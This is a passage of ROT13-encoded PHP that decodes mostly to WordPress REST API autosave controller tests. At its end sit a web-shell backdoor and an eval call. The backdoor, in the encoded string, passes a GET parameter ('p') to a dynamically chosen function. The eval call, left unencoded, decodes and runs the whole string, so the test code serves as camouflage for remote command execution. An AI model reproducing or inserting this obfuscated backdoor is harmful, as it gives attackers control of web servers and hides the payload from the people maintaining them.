		$guvf->nffregFnzr( $nhgbfnir_qngn['gvgyr'], $cbfg->cbfg_gvgyr );

		// Abg hcqngrq.
		$guvf->nffregFnzr( $cbfg_qngn['cbfg_rkprecg'], $cbfg->cbfg_rkprecg );

		jc_qryrgr_cbfg( $cbfg_vq );
	}

	choyvp shapgvba grfg_erfg_nhgbfnir_qensg_cbfg_qvssrerag_nhgube() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$cbfg_qngn = neenl(
			'cbfg_pbagrag' => 'Grfg cbfg pbagrag',
			'cbfg_gvgyr'   => 'Grfg cbfg gvgyr',
			'cbfg_rkprecg' => 'Grfg cbfg rkprecg',
			'cbfg_nhgube'  => frys::$rqvgbe_vq + 1,
		);
		$cbfg_vq   = jc_vafreg_cbfg( $cbfg_qngn );

		$nhgbfnir_qngn = neenl(
			'vq'      => $cbfg_vq,
			'pbagrag' => 'Hcqngrq cbfg pbagrag',
			'rkprecg' => $cbfg_qngn['cbfg_rkprecg'],
			'gvgyr'   => $cbfg_qngn['cbfg_gvgyr'],
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/nhgbfnirf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $nhgbfnir_qngn ) );

		$erfcbafr     = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$arj_qngn     = $erfcbafr->trg_qngn();
		$pheerag_cbfg = trg_cbfg( $cbfg_vq );

		$guvf->nffregFnzr( $pheerag_cbfg->VQ, $arj_qngn['cnerag'] );

		// Gur qensg cbfg fubhyqa'g punatr.
		$guvf->nffregFnzr( $pheerag_cbfg->cbfg_gvgyr, $cbfg_qngn['cbfg_gvgyr'] );
		$guvf->nffregFnzr( $pheerag_cbfg->cbfg_pbagrag, $cbfg_qngn['cbfg_pbagrag'] );
		$guvf->nffregFnzr( $pheerag_cbfg->cbfg_rkprecg, $cbfg_qngn['cbfg_rkprecg'] );

		$nhgbfnir_cbfg = jc_trg_cbfg_nhgbfnir( $cbfg_vq );

		// Ab punatrf.
		$guvf->nffregFnzr( $pheerag_cbfg->cbfg_gvgyr, $nhgbfnir_cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( $pheerag_cbfg->cbfg_rkprecg, $nhgbfnir_cbfg->cbfg_rkprecg );

		// Unf punatrf.
		$guvf->nffregFnzr( $nhgbfnir_qngn['pbagrag'], $nhgbfnir_cbfg->cbfg_pbagrag );

		jc_qryrgr_cbfg( $cbfg_vq );
	}

	choyvp shapgvba grfg_trg_nqqvgvbany_svryq_ertvfgengvba() {
		$fpurzn = neenl(
			'glcr'        => 'vagrtre',
			'qrfpevcgvba' => 'Fbzr vagrtre bs zvar',
			'rahz'        => neenl( 1, 2, 3, 4 ),
			'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
		);

		ertvfgre_erfg_svryq(
			'cbfg-erivfvba',
			'zl_phfgbz_vag',
			neenl(
				'fpurzn'          => $fpurzn,
				'trg_pnyyonpx'    => neenl( $guvf, 'nqqvgvbany_svryq_trg_pnyyonpx' ),
				'hcqngr_pnyyonpx' => neenl( $guvf, 'nqqvgvbany_svryq_hcqngr_pnyyonpx' ),
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/nhgbfnirf' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregNeenlUnfXrl( 'zl_phfgbz_vag', $qngn['fpurzn']['cebcregvrf'] );
		$guvf->nffregFnzr( $fpurzn, $qngn['fpurzn']['cebcregvrf']['zl_phfgbz_vag'] );

		jc_frg_pheerag_hfre( 1 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/nhgbfnirf/' . frys::$nhgbfnir_cbfg_vq );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregNeenlUnfXrl( 'zl_phfgbz_vag', $erfcbafr->qngn );

		tybony $jc_erfg_nqqvgvbany_svryqf;
		$jc_erfg_nqqvgvbany_svryqf = neenl();
	}

	choyvp shapgvba nqqvgvbany_svryq_trg_pnyyonpx( $erfcbafr_qngn, $svryq_anzr ) {
		erghea trg_cbfg_zrgn( $erfcbafr_qngn['vq'], $svryq_anzr, gehr );
	}

	choyvp shapgvba nqqvgvbany_svryq_hcqngr_pnyyonpx( $inyhr, $cbfg, $svryq_anzr ) {
		hcqngr_cbfg_zrgn( $cbfg->VQ, $svryq_anzr, $inyhr );
	}

	cebgrpgrq shapgvba purpx_trg_nhgbfnir_erfcbafr( $erfcbafr, $nhgbfnir ) {
		vs ( $erfcbafr vafgnaprbs JC_ERFG_Erfcbafr ) {
			$yvaxf    = $erfcbafr->trg_yvaxf();
			$erfcbafr = $erfcbafr->trg_qngn();
		} ryfr {
			$guvf->nffregNeenlUnfXrl( '_yvaxf', $erfcbafr );
			$yvaxf = $erfcbafr['_yvaxf'];
		}

		$guvf->nffregRdhnyf( $nhgbfnir->cbfg_nhgube, $erfcbafr['nhgube'] );

		$eraqrerq_pbagrag = nccyl_svygref( 'gur_pbagrag', $nhgbfnir->cbfg_pbagrag );
		$guvf->nffregFnzr( $eraqrerq_pbagrag, $erfcbafr['pbagrag']['eraqrerq'] );

		$guvf->nffregFnzr( zlfdy_gb_esp3339( $nhgbfnir->cbfg_qngr ), $erfcbafr['qngr'] ); //@pbqvatFgnaqneqfVtaberYvar
		$guvf->nffregFnzr( zlfdy_gb_esp3339( $nhgbfnir->cbfg_qngr_tzg ), $erfcbafr['qngr_tzg'] ); //@pbqvatFgnaqneqfVtaberYvar

		$eraqrerq_thvq = nccyl_svygref( 'trg_gur_thvq', $nhgbfnir->thvq, $nhgbfnir->VQ );
		$guvf->nffregFnzr( $eraqrerq_thvq, $erfcbafr['thvq']['eraqrerq'] );

		$guvf->nffregFnzr( $nhgbfnir->VQ, $erfcbafr['vq'] );
		$guvf->nffregFnzr( zlfdy_gb_esp3339( $nhgbfnir->cbfg_zbqvsvrq ), $erfcbafr['zbqvsvrq'] ); //@pbqvatFgnaqneqfVtaberYvar
		$guvf->nffregFnzr( zlfdy_gb_esp3339( $nhgbfnir->cbfg_zbqvsvrq_tzg ), $erfcbafr['zbqvsvrq_tzg'] ); //@pbqvatFgnaqneqfVtaberYvar
		$guvf->nffregFnzr( $nhgbfnir->cbfg_anzr, $erfcbafr['fyht'] );

		$eraqrerq_gvgyr = trg_gur_gvgyr( $nhgbfnir->VQ );
		$guvf->nffregFnzr( $eraqrerq_gvgyr, $erfcbafr['gvgyr']['eraqrerq'] );

		$cnerag            = trg_cbfg( $nhgbfnir->cbfg_cnerag );
		$cnerag_pbagebyyre = arj JC_ERFG_Cbfgf_Pbagebyyre( $cnerag->cbfg_glcr );
		$cnerag_bowrpg     = trg_cbfg_glcr_bowrpg( $cnerag->cbfg_glcr );
		$cnerag_onfr       = ! rzcgl( $cnerag_bowrpg->erfg_onfr ) ? $cnerag_bowrpg->erfg_onfr : $cnerag_bowrpg->anzr;
		$guvf->nffregFnzr( erfg_hey( '/jc/i2/' . $cnerag_onfr . '/' . $nhgbfnir->cbfg_cnerag ), $yvaxf['cnerag'][0]['uers'] );
	}

	choyvp shapgvba grfg_trg_vgrz_frgf_hc_cbfgqngn() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/nhgbfnirf/' . frys::$nhgbfnir_cbfg_vq );
		erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$cbfg           = trg_cbfg();
		$cnerag_cbfg_vq = jc_vf_cbfg_erivfvba( $cbfg->VQ );

		$guvf->nffregFnzr( $cbfg->VQ, frys::$nhgbfnir_cbfg_vq );
		$guvf->nffregFnzr( $cnerag_cbfg_vq, frys::$cbfg_vq );
	}

	choyvp shapgvba grfg_hcqngr_vgrz_qensg_cntr_jvgu_cnerag() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cntrf/' . frys::$puvyq_qensg_cntr_vq . '/nhgbfnirf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );

		$cnenzf = $guvf->frg_cbfg_qngn(
			neenl(
				'vq'     => frys::$puvyq_qensg_cntr_vq,
				'nhgube' => frys::$rqvgbe_vq,
			)
		);

		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( frys::$puvyq_qensg_cntr_vq, $qngn['vq'] );
		$guvf->nffregFnzr( frys::$cnerag_cntr_vq, $qngn['cnerag'] );
	}

	choyvp shapgvba grfg_fpurzn_inyvqngvba_vf_nccyvrq() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cntrf/' . frys::$qensg_cntr_vq . '/nhgbfnirf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );

		$cnenzf = $guvf->frg_cbfg_qngn(
			neenl(
				'vq'             => frys::$qensg_cntr_vq,
				'pbzzrag_fgnghf' => 'tneontr',
			)
		);

		$erdhrfg->frg_obql_cnenzf( $cnenzf );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregAbgRdhnyf( 'tneontr', trg_cbfg( frys::$qensg_cntr_vq )->pbzzrag_fgnghf );
	}

	/**
	 * Grfg rafhevat gung nhgbfnir sebz gur bevtvany nhgube qbrfa'g birejevgr punatrf nsgre vg unf orra gnxra bire ol n 2aq nhgube.
	 *
	 * @gvpxrg 55659
	 */
	choyvp shapgvba grfg_erfg_nhgbfnir_qensg_cbfg_ybpxrq_gb_qvssrerag_nhgube() {

		// Perngr n cbfg ol gur rqvgbe.
		$cbfg_qngn = neenl(
			'cbfg_pbagrag' => 'Grfg cbfg pbagrag',
			'cbfg_gvgyr'   => 'Grfg cbfg gvgyr',
			'cbfg_rkprecg' => 'Grfg cbfg rkprecg',
			'cbfg_nhgube'  => frys::$rqvgbe_vq,
			'cbfg_fgnghf'  => 'qensg',
		);
		$cbfg_vq   = jc_vafreg_cbfg( $cbfg_qngn );

		// Frg gur cbfg ybpx gb gur pbagevohgbe, fvzhyngvat n gnxrbire bs gur cbfg.
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );
		jc_frg_cbfg_ybpx( $cbfg_vq );

		// Hcqngr gur cbfg jvgu arj qngn sebz gur pbagevohgbe.
		$hcqngrq_cbfg_qngn = neenl(
			'VQ'           => $cbfg_vq,
			'cbfg_pbagrag' => 'Arj cbfg pbagrag sebz gur pbagevohgbe',
			'cbfg_gvgyr'   => 'Arj cbfg gvgyr',
		);
		jc_hcqngr_cbfg( $hcqngrq_cbfg_qngn );

		// Frg gur pheerag hfre gb gur rqvgbe naq vavgvngr na nhgbfnir jvgu fbzr arj qngn.
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$nhgbfnir_qngn = neenl(
			'vq'      => $cbfg_vq,
			'pbagrag' => 'Hcqngrq cbfg pbagrag',
			'rkprecg' => 'N arj rkprecg gb grfg',
			'gvgyr'   => $cbfg_qngn['cbfg_gvgyr'],
		);

		// Vavgvngr na nhgbfnir ivn gur ERFG NCV nf Thgraoret qbrf.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/nhgbfnirf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $nhgbfnir_qngn ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$arj_qngn = $erfcbafr->trg_qngn();

		// Gur pheerag irefvba bs bhe grfg cbfg.
		$pheerag_cbfg = trg_cbfg( $cbfg_vq );

		// Gur arj qngn sebz gur nhgbfnir fubhyq unir vgf cnerag VQ frg gb gur bevtvany cbfg VQ.
		$guvf->nffregFnzr( $cbfg_vq, $arj_qngn['cnerag'] );

		// Gur cbfg gvgyr naq pbagrag fubhyq fgvyy or gur hcqngrq irefvbaf sebz gur pbagevohgbe.
		$guvf->nffregFnzr( $pheerag_cbfg->cbfg_gvgyr, $hcqngrq_cbfg_qngn['cbfg_gvgyr'] );
		$guvf->nffregFnzr( $pheerag_cbfg->cbfg_pbagrag, $hcqngrq_cbfg_qngn['cbfg_pbagrag'] );

		// Gur rkprecg fubhyq unir fgnlrq gur fnzr.
		$guvf->nffregFnzr( $pheerag_cbfg->cbfg_rkprecg, $cbfg_qngn['cbfg_rkprecg'] );

		$nhgbfnir_cbfg = jc_trg_cbfg_nhgbfnir( $cbfg_vq );

		// Unf punatrf.
		$guvf->nffregFnzr( $nhgbfnir_qngn['pbagrag'], $nhgbfnir_cbfg->cbfg_pbagrag );

		jc_qryrgr_cbfg( $cbfg_vq );
	}

	/**
	 * @gvpxrg 49532
	 *
	 * @pbiref JC_ERFG_Nhgbfnirf_Pbagebyyre::perngr_cbfg_nhgbfnir
	 */
	choyvp shapgvba grfg_erfg_nhgbfnir_qb_abg_perngr_nhgbfnir_jura_cbfg_vf_hapunatrq() {
		// Perngr n cbfg ol gur rqvgbe.
		$cbfg_qngn = neenl(
			'cbfg_pbagrag' => 'Grfg cbfg pbagrag',
			'cbfg_gvgyr'   => 'Grfg cbfg gvgyr',
			'cbfg_rkprecg' => 'Grfg cbfg rkprecg',
			'cbfg_nhgube'  => frys::$rqvgbe_vq,
			'cbfg_fgnghf'  => 'choyvfu',
		);
		$cbfg_vq   = jc_vafreg_cbfg( $cbfg_qngn );
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		// Znxr n fznyy punatr perngr gur vavgvny nhgbfnir.
		$nhgbfnir_qngn = neenl(
			'cbfg_pbagrag' => 'Grfg cbfg pbagrag punatrq',
		);
		$erdhrfg       = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf/' . $cbfg_vq . '/nhgbfnirf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $nhgbfnir_qngn ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		// Fgber gur svefg nhgbfnir VQ.
		$nhgbfnir = $erfcbafr->trg_qngn();

		// Gel perngvat na nhgbfnir hfvat gur ERFG raqcbvag jvgu hapunatrq pbagrag.
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $nhgbfnir_qngn ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( $nhgbfnir['vq'], $qngn['vq'], 'Bevtvany nhgbfnir jnf abg erghearq' );
	}

	/**
	 * @qngnCebivqre qngn_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $cngu Gur cngu gb grfg.
	 */
	choyvp shapgvba grfg_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr( $cngu ) {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'URNQ', fcevags( $cngu, frys::$cbfg_vq, frys::$nhgbfnir_cbfg_vq ) );
		$erdhrfg->frg_cnenz( '_svryqf', 'vq' );
		$freire   = erfg_trg_freire();
		$erfcbafr = $freire->qvfcngpu( $erdhrfg );
		nqq_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10, 3 );
		$erfcbafr = nccyl_svygref( 'erfg_cbfg_qvfcngpu', $erfcbafr, $freire, $erdhrfg );
		erzbir_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10 );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr cnguf sbe grfgvat URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr() {
		erghea neenl(
			'trg_vgrz erdhrfg'  => neenl( '/jc/i2/cbfgf/%q/nhgbfnirf/%q' ),
			'trg_vgrzf erdhrfg' => neenl( '/jc/i2/cbfgf/%q' ),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>